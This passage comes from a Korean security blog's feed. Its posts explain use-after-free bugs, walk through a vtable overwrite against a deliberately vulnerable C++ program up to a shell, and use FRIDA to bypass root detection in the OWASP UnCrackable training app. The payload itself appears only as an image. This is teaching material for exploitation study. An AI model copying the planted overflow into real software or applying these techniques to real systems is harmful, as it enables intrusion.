&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-24.png&quot; alt=&quot;[그림 5-24]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;짜잔….uid가 개…root로 잡혀있는것을 확인 가능합니다.&lt;/p&gt;

&lt;p&gt;지금까지 진행한 내용은 오늘 포스팅한 ROP를 위해 알아야 하는 사전 지식의 개념이었으며 오늘 해본 ROP는 다른 여러 ROP의 기본 개념이 됩니다. 기회가 된다면 다른 ROP도 포스팅 하겠습니다.(믿지마세요…..) 그리고 지금까지 한 Stack BOF는 Heap 공부하기 위한 준비였습니다…&lt;/p&gt;

&lt;p&gt;다음 포스팅부터는 모두가 좋아하는 &lt;del&gt;Hip&lt;/del&gt;….Heap BOF에 대해 또 천천히 가보도록 하겠습니다.&lt;/p&gt;

&lt;p&gt;고생하셨슴돠!!!&lt;/p&gt;

&lt;h2 id=&quot;references-참고-자료&quot;&gt;References 참고 자료&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://shayete.tistory.com/&quot;&gt;https://shayete.tistory.com/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.lazenca.net/display/TEC/02.TechNote&quot;&gt;https://www.lazenca.net/display/TEC/02.TechNote&lt;/a&gt;&lt;/p&gt;</content><author><name>Sulla</name></author><category term="Posts" /><summary type="html">RTL Chaining &amp;amp; ROP(Return Oriented Programming)</summary></entry><entry><title type="html">Use After Free</title><link href="/windows-0x0c" rel="alternate" type="text/html" title="Use After Free" /><published>2019-05-06T20:18:00+09:00</published><updated>2019-05-06T20:18:00+09:00</updated><id>/windows-0x0c</id><content type="html" xml:base="/windows-0x0c">&lt;h1 id=&quot;0x0c-use-after-free&quot;&gt;0x0c Use After Free&lt;/h1&gt;

&lt;p&gt;안녕하세요. Joel입니다.&lt;/p&gt;

&lt;p&gt;오늘은 Use After Free에 대해 알아보도록 하겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;what-is-use-after-free&quot;&gt;What is Use After Free?&lt;/h5&gt;

&lt;p&gt;Use After Free는 단어 그대로 Free된 Pointer를 사용했을 때 발생하는 취약점입니다.&lt;/p&gt;

&lt;p&gt;UAF를 설명할 때 주로 다음의 샘플 코드를 많이 이용하는데 UAF를 한 번에 잘 설명하고 있습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Object *obj = (Object *)malloc(sizeof(Object));
obj-&amp;gt;Method();
free(obj);		// Free
...
obj-&amp;gt;Method();	// Use
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;위 코드의 첫 코드를 보면 malloc으로 Object의 크기만큼 Heap을 할당해주고 있습니다.&lt;/p&gt;

&lt;p&gt;그리고 세 번째 줄에서 할당했던 객체를 해제해주고 있죠.&lt;/p&gt;

&lt;p&gt;마지막 코드를 보시면, 이미 해제된 Pointer가 다시 사용되고 있는 것을 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;이처럼, Free된 후 해당 메모리를 가리키던 Pointer가 다시 사용될 때를 UAF 버그라고 이야기합니다.&lt;/p&gt;

&lt;p&gt;그런데..이거 가지고 뭘 할 수가 있지??&lt;/p&gt;

&lt;p&gt;그렇죠.. 아직 이 코드만 가지고는 명확한 이해가 안 될 수 있습니다.&lt;/p&gt;

&lt;p&gt;다음 예제를 가지고 조금 더 쉽게 설명해보도록 하겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;uaf-example&quot;&gt;UAF Example&lt;/h5&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

typedef struct uaf {

	void (*vulnfunc)();

}uaf;

void good() {
	printf(&quot;I'm Joel\n&quot;);
}

void bad() {
	printf(&quot;I'm not Joel\n&quot;);
}

int main(int argc, char* cargv[]) {

	uaf * first = malloc(sizeof(uaf));
	uaf * second;

	first-&amp;gt;vulnfunc = good;
	first-&amp;gt;vulnfunc();

	free(first);

	second = malloc(sizeof(uaf));
	second-&amp;gt;vulnfunc = bad;
	
	first-&amp;gt;vulnfunc();

	return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;위 코드를 보면 먼저, first라는 객체에 uaf 크기만큼 Heap을 할당해주었습니다.&lt;/p&gt;

&lt;p&gt;그리고 vulnfunc에 good 함수의 주소를 넣어주었습니다.&lt;/p&gt;

&lt;p&gt;그럼 first-&amp;gt;vulnfunc();를 실행하게 되면 “I’m Joel”이라는 메시지가 출력되겠네요.&lt;/p&gt;

&lt;p&gt;여기까진 쉽죠??&lt;/p&gt;

&lt;p&gt;이후 first를 free 해줍니다.&lt;/p&gt;

&lt;p&gt;그리곤 second 객체를 생성하고 uaf 크기만큼 Heap을 할당해주었습니다.&lt;/p&gt;

&lt;p&gt;uaf 크기만큼 할당하고 해제한 뒤, 다시 uaf 크기만큼 할당하면 second는 first가 할당받았던 Heap과 동일한 영역을 할당받게 됩니다.&lt;/p&gt;

&lt;p&gt;지난 번 Heap 구조를 설명했던 것.. 기억하시나요?&lt;/p&gt;

&lt;p&gt;할당된 Heap을 해제하게 되면 Kernel로 바로 보내버리는 게 아니라, List에 넣어둔다고 했었죠?&lt;/p&gt;

&lt;p&gt;그런 다음 다시 동일한 크기의 Heap을 할당해달라고 요청하면 방금 해제된 영역을 재할당해줍니다.&lt;/p&gt;

&lt;p&gt;그럼 first가 해제된 다음 second를 요청하니까 second에는 first에 할당되었던 것과 동일한 영역이 할당되겠죠?&lt;/p&gt;

&lt;p&gt;지금까지 설명한 내용을 표현하자면 다음과 같이 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0c_1.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;다시 코드로 돌아가서, second의 vulnfunc에 bad 함수의 주소를 넣어주고 있습니다.&lt;/p&gt;

&lt;p&gt;마지막으로, 이미 해제된 Pointer를 요청합니다.&lt;/p&gt;

&lt;p&gt;first-&amp;gt;vulnfunc()를 호출하면 어떤 일이 생기게 될까요?&lt;/p&gt;

&lt;p&gt;second에 bad의 함수를 넣어뒀기 때문에 I’m not Joel이 호출되겠죠?&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0c_2.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;실제 실행을 해보니 동일하게 구동이 되네요.&lt;/p&gt;

&lt;p&gt;지금까지 설명한 것을 중요 부분만 한 번 더 따라가 볼게요.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;uaf * first = malloc(sizeof(uaf));
first-&amp;gt;vulnfunc = good;
first-&amp;gt;vulnfunc();
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;first 객체를 생성하고 uaf만큼 Heap을 할당해줍니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;free(first);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;그런 다음 free로 해제해줍니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;first-&amp;gt;vulnfunc();
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;그리고 개발자의 부주의로 인해 이미 할당 해제된 Pointer가 재사용되고 있습니다.&lt;/p&gt;

&lt;p&gt;뭔가 감이 오시나요?&lt;/p&gt;

&lt;p&gt;해제와 재사용 사이에 second 객체 부분이 있었고, second는 first와 동일한 크기, 위치를 할당받았었죠?&lt;/p&gt;

&lt;p&gt;이 second 부분이 맨 처음 샘플 코드에서 … 부분인데, 이 부분에서 만약 shellcode의 주소로 바꿀 수 있다면 어떻게 될까요?&lt;/p&gt;

&lt;p&gt;first-&amp;gt;vulnfunc();가 구동되는 순간, Pointer가 가리키는 영역엔 shellcode의 주소가 있을 것이고…&lt;/p&gt;

&lt;p&gt;shellcode가 실행되겠죠?&lt;/p&gt;

&lt;p&gt;지금까지 설명한 내용이 UAF의 기본 개념입니다.&lt;/p&gt;

&lt;p&gt;UAF를 이용한 Exploit은 UAF의 절친 HeapSpray을 살펴본 후 진행할 예정이니까 그때까지만 기다려주세요 ㅎㅎ&lt;/p&gt;

&lt;p&gt;다음 글에서 뵙겠습니다!&lt;/p&gt;</content><author><name>Joel Park</name></author><category term="Posts" /><summary type="html">0x0c Use After Free</summary></entry><entry><title type="html">Vtable Overwrite</title><link href="/windows-0x0b" rel="alternate" type="text/html" title="Vtable Overwrite" /><published>2019-04-18T20:18:00+09:00</published><updated>2019-04-18T20:18:00+09:00</updated><id>/windows-0x0b</id><content type="html" xml:base="/windows-0x0b">&lt;h1 id=&quot;0x0b-vtable-overwirte&quot;&gt;0x0b Vtable Overwirte&lt;/h1&gt;

&lt;p&gt;안녕하세요. Joel입니다.&lt;/p&gt;

&lt;p&gt;오늘은 Vtable Overwrite에 대해 알아보도록 하겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;what-is-virtual-method&quot;&gt;What is Virtual Method?&lt;/h5&gt;

&lt;p&gt;Vtable에 대한 이해를 하기 위해서는 먼저, 가상함수가 무엇인지부터 알아야 합니다.&lt;/p&gt;

&lt;p&gt;여기서 상속, 다형성 등 모든 개념들을 다 살펴볼 수는 없습니다.&lt;/p&gt;

&lt;p&gt;간단히 필요 부분만 살펴보고 넘어갈 텐데, 모르는 부분은 직접 찾아서 공부해보시기 바랍니다.&lt;/p&gt;

&lt;p&gt;가상함수는 한마디로 다형성을 위해 씁니다.&lt;/p&gt;

&lt;p&gt;예를 들어 다음과 같은 클래스가 있다고 칩시다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;

class Unit {
public:
	void Sound()
	{
		printf(&quot;Unit!\n&quot;);
	}

};

class Marine : public Unit {
public:
	void Sound() {
		printf(&quot;You wanna piece of me, boy?\n&quot;);
	}

};

class Firebat : public Unit {
public:
	void Sound() {
		printf(&quot;Need a light?\n&quot;);
	}

};

int main() {

	Unit * unit = new Unit;
	Marine * marine = new Marine;
	Firebat * firebat = new Firebat;

	unit-&amp;gt;Sound();

	unit = marine;
	unit-&amp;gt;Sound();

	unit = firebat;
	unit-&amp;gt;Sound();

}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;위와 같이 코드를 짜고 실행시키면 마린과 파이어뱃은 각자의 대사를 말할 것 같지만, 다음과 같이 출력됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_1.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;예상과는 다르죠?&lt;/p&gt;

&lt;p&gt;이번에는 다음과 같이 virtual 키워드를 사용하여 가상함수로 코드를 수정했습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;

class Unit {
public:
	virtual void Sound()
	{
		printf(&quot;Unit!\n&quot;);
	}

};

class Marine : public Unit {
public:
	virtual void Sound() {
		printf(&quot;You wanna piece of me, boy?\n&quot;);
	}

};

class Firebat : public Unit {
public:
	virtual void Sound() {
		printf(&quot;Need a light?\n&quot;);
	}

};

int main() {

	Unit * unit = new Unit;
	Marine * marine = new Marine;
	Firebat * firebat = new Firebat;

	unit-&amp;gt;Sound();

	unit = marine;
	unit-&amp;gt;Sound();

	unit = firebat;
	unit-&amp;gt;Sound();

}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;이 코드를 실행하면 다음과 같이 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_2.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;virtual만 붙였을 뿐인데 처음 예상했던 대로 동작이 되네요.&lt;/p&gt;

&lt;p&gt;즉, 이 가상함수라는 것은 파생 클래스가 안전하게 재정의할 수 있는 것이라고 할 수 있습니다.&lt;/p&gt;

&lt;p&gt;이를 우리가 동적 바인딩이라고도 하는데, 동적 바인딩은 실행할 함수의 주소가 컴파일 시에 결정되는 것이 아니라, 포인터로 호출할 때 그 주소가 결정됩니다.&lt;/p&gt;

&lt;p&gt;좀 더 정확하게는 호출 시에 정해진다라기보다 컴파일 시에 미리 가상함수 테이블을 만들어두고 거기에 호출하고자 하는 함수를 넣어두는 형태입니다.&lt;/p&gt;

&lt;p&gt;이 가상함수 테이블이 바로 vtable입니다.&lt;/p&gt;

&lt;p&gt;그래서 실행이 되면 객체의 vtable을 찾아가서 호출할 함수의 번지를 찾아가는 로직이죠.&lt;/p&gt;

&lt;p&gt;지금까지 설명한 내용을 도식화하면 다음과 같습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_3.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이번엔 아래 코드를 가지고 vtable부터 overwrite를 살펴보도록 하겠습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;cstring&amp;gt;
#include &quot;windows.h&quot;
#include &amp;lt;iostream&amp;gt;

#pragma warning (disable:4996)
#define _CRT_SECURE_NO_WARNINGS
using namespace std;

class Book {
private:
	char name[100];
	int page;
public:
	Book(const char * _name, int _page) {
		strcpy(name, _name);
		page = _page;
	}
	virtual void setName(char * input) {
		char * buf = (char *)malloc(20);
		strncpy(buf, input, 19);
		printName(buf);
		getName();
	}
	virtual char * getName() {
		return name;
	}
	virtual void printName(char * buf) {
		printf(&quot;%s\n&quot;, buf);
	}

};

int main(int argc, char * argv[]) {

	static char contents[1000] = { 0, };
	static Book mybook(&quot;Windows_Hacking&quot;, 1);
	printf(&quot;object addr : 0x%08x\n&quot;, &amp;amp;mybook);
	printf(&quot;object vtable addr : 0x%08p\n&quot;, mybook);
	printf(&quot;buf addr : %08x\n&quot;, &amp;amp;contents);

	FILE * f = fopen(argv[1], &quot;r&quot;);
	fgets(contents, 1500, f);
	mybook.setName(contents);
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;디버거로 vtable을 따라가 보도록 하겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_4.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;디버거로 쭉 따라가보면 0x004047D0에 객체가 생성된 것을 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;그리고 그 객체에는 vtable의 주소가 들어있고 뒤 이어 “Windows_Hacking”이 담겨 있습니다.&lt;/p&gt;

&lt;p&gt;해당 주소에서 빨간색으로 표시해놓은 부분이 vtable의 주소입니다.&lt;/p&gt;

&lt;p&gt;더 따라가 봅시다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_5.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;vtable 시작 주소로 찾아간 모습입니다.&lt;/p&gt;

&lt;p&gt;여기에 보면 0x401040, 0x401080, 0x401090 등등 보이시죠? 얘들이 virtual method의 주소입니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_6.png&quot; alt=&quot;[그림 1-6]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;[eax+8]이 call되는데 오른쪽에 eax를 보면 vtable을 가리키고 있는 것을 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;vtable에서 +8 위치는 0x00401090이 되겠네요.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_7.png&quot; alt=&quot;[그림 1-7]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위 그림을 통해 확인해보면 0x00401090은 printfName이고 화면에 buf 값이 출력되겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_8.png&quot; alt=&quot;[그림 1-8]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;지금까지 vtable에 대해 알아봤고 공격 이야기로 넘어가볼게요.&lt;/p&gt;

&lt;h5 id=&quot;vtable-overwrite&quot;&gt;Vtable Overwrite?&lt;/h5&gt;

&lt;p&gt;이제 대충 vtable이라는 게 무엇인지는 알겠는데 공격은 어떻게 하겠다는 걸까요?&lt;/p&gt;

&lt;p&gt;공격 아이디어는 아까 전 위에서 살펴봤던 이 그림에 있습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_4.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;객체가 생성되었을 때의 주소와 값입니다.&lt;/p&gt;

&lt;p&gt;여기 첫 4바이트가 vtable의 주소라고 했었죠?&lt;/p&gt;

&lt;p&gt;만약 이 주소를 Shellcode가 있는 곳으로 바꿀 수가 있다면?&lt;/p&gt;

&lt;p&gt;네 맞습니다. 끝났어요. ㅎㅎ&lt;/p&gt;

&lt;p&gt;다만 주의해야 할 점이 객체의 vtable 값을 수정할 때는 shellcode가 들어있는 곳의 주소가 들어가야한다는 거죠.&lt;/p&gt;

&lt;p&gt;method가 실행되기까지의 과정을 생각해보시면 됩니다.&lt;/p&gt;

&lt;p&gt;객체에서 vtable 주소 -&amp;gt; vtable에서 함수의 주소 -&amp;gt; 실제 함수&lt;/p&gt;

&lt;p&gt;이런 식으로 따라가는 것이죠?&lt;/p&gt;

&lt;p&gt;그럼 우리는 다음과 같이 구성해야겠네요.&lt;/p&gt;

&lt;p&gt;객체에서 vtable 변조 -&amp;gt; 가짜 vtable (쉘 코드 주소) -&amp;gt; 쉘 코드&lt;/p&gt;

&lt;p&gt;자 그럼 실제로 overwrite를 진행해보도록 하겠습니다.&lt;/p&gt;

&lt;p&gt;먼저 얼마나 값을 넣어야 덮을 수 있을지 봐야겠네요?&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_9.png&quot; alt=&quot;[그림 1-9]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;fgets로 버퍼에 값을 넣어주는 것을 따라가보면 0x004043E8에 AAAA를 넣고 있는 것을 알 수 있습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_10.png&quot; alt=&quot;[그림 1-10]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;그리고 객체의 위치는 0x004047D8이네요.&lt;/p&gt;

&lt;p&gt;그럼 거리는 4047D8 - 4043E8 = 3F0 = 1008이네요.&lt;/p&gt;

&lt;p&gt;vtable 값도 덮어써야 하니까 총 거리는 1012!!&lt;/p&gt;

&lt;p&gt;거리도 알아냈으니 Payload를 작성해보겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_12.png&quot; alt=&quot;[그림 1-12]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;Payload는 이렇게 작성했습니다.&lt;/p&gt;

&lt;p&gt;Payload 마지막 부분은 버퍼 시작 주소로 구성했고, 첫 부분은 fake function들로 구성했습니다.&lt;/p&gt;

&lt;p&gt;그런데 Payload를 보면 fake_vfunc 사이에 AAAA가 들어 있죠?&lt;/p&gt;

&lt;p&gt;이건 다음 코드를 보시면 이해가 가실겁니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_11.png&quot; alt=&quot;[그림 1-11]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;어셈블리어 코드를 보면 [eax+8] 위치의 함수를 호출하고 있죠?&lt;/p&gt;

&lt;p&gt;여기서 eax의 값은 우리가 변조한 버퍼의 시작주소입니다.&lt;/p&gt;

&lt;p&gt;그래서 버퍼 시작 주소에 +8 위치에 Shellcode 주소를 두었습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_13.png&quot; alt=&quot;[그림 1-13]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;짠! Shell이 잘 떨어지네요.&lt;/p&gt;

&lt;p&gt;지금까지 Vtable 개념과 공격 기법을 알아봤습니다.&lt;/p&gt;

&lt;p&gt;다음 시간에는 UAF와 HeapSpray를 알아볼 것이고, 버전별 IE exploit을 진행해보겟습니다.&lt;/p&gt;</content><author><name>Joel Park</name></author><category term="Posts" /><summary type="html">0x0b Vtable Overwirte</summary></entry><entry><title type="html">android-0x02</title><link href="/android-0x02" rel="alternate" type="text/html" title="android-0x02" /><published>2019-04-12T14:00:00+09:00</published><updated>2019-04-12T14:00:00+09:00</updated><id>/android-0x02</id><content type="html" xml:base="/android-0x02">&lt;h1 id=&quot;android-동적-분석&quot;&gt;Android 동적 분석&lt;/h1&gt;

&lt;p&gt;안녕하세요 chaem 입니다.&lt;/p&gt;

&lt;p&gt;지난 포스팅에서 다루었던 Android 정적 분석에 이어서 이번에는 Android 동적 분석에 대해 포스팅 하려고 합니다.&lt;/p&gt;

&lt;p&gt;Android를 동적 분석하는 방법은 다양하지만 이번 포스팅에서는 FRIDA이용하는 방법에 대해 알아보겠습니다.&lt;/p&gt;

&lt;h4 id=&quot;frida&quot;&gt;FRIDA&lt;/h4&gt;
&lt;p&gt;FRIDA를 이용한 동적 분석은 Android 앱을 후킹하여 분석하는 방법입니다.&lt;/p&gt;

&lt;p&gt;분석 환경은 아래와 같습니다.&lt;/p&gt;

&lt;p&gt;OS : Window7&lt;/p&gt;

&lt;p&gt;Tools : FRIDA, frida-server, nox, adb, python, pip&lt;/p&gt;

&lt;p&gt;FRIDA를 사용하기 위해서는 python 및 pip가 설치되어있어야 하며,&lt;br /&gt;
아래와 같이 cmd에서 “pip install  frida” 명령어를 입력하여 FRIDA를 쉽게 설치할 수 있습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x02/01.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;FRIDA 설치 후 하기 링크에서 Android architecure에 맞는 frida-server를 다운로드합니다.&lt;/p&gt;

&lt;p&gt;https://github.com/frida/frida/releases&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x02/02.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;
&lt;figure&gt;

다운로드한 frida-server를 Android 기기에 설치하고 실행 권한 부여 후 실행시켜줍니다.
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x02/03.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;


아래 링크의 예제 앱을 이용해서 동적 분석을 진행하겠습니다.&lt;br /&gt;
https://github.com/OWASP/owasp-mstg/tree/master/Crackmes/Android&lt;br /&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x02/03-1.png&quot; alt=&quot;[그림 1-3-1]&quot; /&gt;
&lt;/figure&gt;
&lt;br /&gt;
  
앱을 실행하면 루팅을 탐지하게 되고, ok 버튼을 누르면 앱이 종료되는 것을 확인할 수 있습니다.  
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x02/04.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
&lt;/figure&gt;
&lt;figure&gt;

앱이 종료되지 않도록 후킹 포인트를 찾기 위해 MainActivity를 확인해보겠습니다.&lt;br /&gt;
MainActivity를 살펴보면 ok 버튼을 누르면 System.exit(0)를 호출하는 것을 확인할 수 있습니다.

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x02/05.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
&lt;/figure&gt;
&lt;figure&gt;

따라서 System.exit 함수가 호출될 때 해당 함수를 후킹해보도록 하겠습니다.&lt;br /&gt;
아래 python 코드를 이용해 후킹을 시도하면 ok 버튼을 눌러도 앱이 종료되지 않는 것을 확인할 수 있습니다.
 
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x02/06.png&quot; alt=&quot;[그림 1-6]&quot; /&gt;
&lt;/figure&gt;
&lt;figure&gt;

이후 특정 문자열을 입력하여 인증하는 절차가 나옵니다.
아래와 같이 잘못된 문자열을 입력할 시 재시도하라는 메시지가 출력되고 있습니다.

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x02/07.png&quot; alt=&quot;[그림 1-7]&quot; /&gt;
&lt;/figure&gt;
&lt;figure&gt;

특정 문자열 확인을 위해 아래 verify 함수를 확인해보면 인증 로직인 if(a.a(obj))을 확인할 수 있습니다.

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x02/08.png&quot; alt=&quot;[그림 1-8]&quot; /&gt;
&lt;/figure&gt;
&lt;figure&gt;

sg.vantagepoint.uncrackable1.a class에서는 입력된 문자열과 암호를 복호화한 값과 비교하여 결과를 리턴하는 것을 확인할 수 있습니다.

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x02/09.png&quot; alt=&quot;[그림 1-9]&quot; /&gt;
&lt;/figure&gt;
&lt;figure&gt;

마지막으로 sg.vantagepoint.a.a class의 a함수를 확인해보면 최종으로 복호화된 문자열을 리턴하는 것을 확인할 수 있습니다.

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x02/10.png&quot; alt=&quot;[그림 1-10]&quot; /&gt;
&lt;/figure&gt;
&lt;figure&gt;

분석한 결과를 토대로 암호화된 특정 문자열을 복호화하여 출력하는 python 코드를 아래와 같이 작성해보았습니다.

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x02/11.png&quot; alt=&quot;[그림 1-11]&quot; /&gt;
&lt;/figure&gt;
&lt;figure&gt;

코드를 실행한 결과 복호화된 문자열을 확인할 수 있었고, 해당 문자열을 입력한 결과 성공이라는 메시지가 출력되는 것을 확인했습니다.

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x02/12.png&quot; alt=&quot;[그림 1-12]&quot; /&gt;
&lt;/figure&gt;
&lt;figure&gt;


지금까지 Android 동적 분석에 대해 알아보았고, 다음 포스팅에서는 SSL Pinning 우회 방법에 대해 알아보도록 하겠습니다.&lt;br /&gt;
&lt;br /&gt;
감사합니다.

&lt;/figure&gt;&lt;/figure&gt;&lt;/figure&gt;&lt;/figure&gt;&lt;/figure&gt;&lt;/figure&gt;&lt;/figure&gt;&lt;/figure&gt;&lt;/figure&gt;&lt;/figure&gt;</content><author><name>Chaem</name></author><category term="Posts" /><summary type="html">Android 동적 분석</summary></entry><entry><title type="html">Windows-Heap 정의</title><link href="/windows-0x0a" rel="alternate" type="text/html" title="Windows-Heap 정의" /><published>2019-04-02T20:18:00+09:00</published><updated>2019-04-02T20:18:00+09:00</updated><id>/windows-0x0a</id><content type="html" xml:base="/windows-0x0a">&lt;h1 id=&quot;0x0a-windows-heap&quot;&gt;0x0a Windows-Heap&lt;/h1&gt;

&lt;p&gt;안녕하세요. Joel입니다.&lt;/p&gt;

&lt;p&gt;오늘부터는 Windows Heap에 대해 알아보도록 하겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;what-is-heap&quot;&gt;What is Heap?&lt;/h5&gt;

&lt;p&gt;Heap은 프로세스가 실행되는 동안 메모리를 필요한만큼 동적으로 할당하여 사용하는 영역입니다.&lt;/p&gt;

&lt;p&gt;그리고 c/c++에서는 malloc, new 함수를 사용하여 Heap 영역을 할당받아 사용합니다.&lt;/p&gt;

&lt;p&gt;윈도우에서는 힙을 이용할 수 있도록 API 함수들을 제공하고 있는데 대표적인 윈도우 힙 함수는 다음과 같습니다.&lt;/p&gt;

&lt;ul&gt;
